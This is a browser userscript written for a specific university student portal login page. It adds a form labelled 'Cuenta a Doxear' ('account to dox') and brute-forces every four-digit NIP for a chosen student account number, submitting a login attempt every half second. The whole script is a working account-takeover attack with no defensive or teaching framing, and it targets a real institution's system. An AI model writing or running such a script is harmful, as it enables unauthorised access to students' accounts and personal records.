// ==UserScript==
// @name         Logear Syllabus
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://sisalt.uaeh.edu.mx/sape/sapemovil/index.php
// @icon         https://www.google.com/s2/favicons?sz=64&domain=edu.mx
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Returns a Promise that resolves after "ms" Milliseconds
    const timer = ms => new Promise(res => setTimeout(res, ms))

    //  Elementos del formulario original
    const labelNumCuenta = document.querySelector("#txtNumCuenta");
    const labelNip = document.querySelector("#txtNIP");
    const boton = document.querySelector(".btn-lg");

    //  ingresar() - Intentara un inicio de sesión con el NIP que se pase como argumento
    const ingresar = function(nip) {
        labelNip.value = nip;
        boton.click();
    }

    let combinacion = "";
    const numOpciones = 10;

    async function load (inicio, fin) { // We need to wrap the loop into an async function for this to work
        for(let i = inicio; i <= fin; i++){
            let digito1 = `${i}`;

            for(let j = 0; j < numOpciones; j++){
                let digito2 = `${j}`;

                for(let k = 0; k < numOpciones; k++){
                    let digito3 = `${k}`;

                    for(let l = 0; l < numOpciones; l++){
                        let digito4 = `${l}`;
                        combinacion = `${digito1}${digito2}${digito3}${digito4}`;

                        console.log(combinacion);
                        ingresar(combinacion);
                        await timer(500);
                    }
                }
            }
        }
    }

    // load();

    //  Crear formulario de configuracion
    const footer = document.querySelector("footer");
    const formHTML = `
    <form class="formulario" style="width: 20%; margin: -300px 0 30px 60px">
        <label>Cuenta a Doxear: </label>
        <input type="num" class="numCuenta form-control">
        <br>
        <label>Inicio: </label>
        <input type="num" class="inicio form-control">
        <br>
        <label>Final: </label>
        <input type="num" class="final form-control">
        <br>
        <button class="btnDoxear btn btn-lg btn-danger btn-block">Doxear</button>
    </form>`;

    footer.insertAdjacentHTML("beforebegin", formHTML);

    const formularioEl = document.querySelector(".formulario");
    const inputNum = document.querySelector(".numCuenta");
    const inputInicio = document.querySelector(".inicio");
    const inputFinal = document.querySelector(".final");

    formularioEl.addEventListener("submit", async function(e) {
        e.preventDefault();

        const numCuenta = parseInt(inputNum.value);
        const inicio = parseInt(inputInicio.value);
        const final = parseInt(inputFinal.value);

        labelNumCuenta.value = numCuenta;

        load(inicio, final);
    });

})();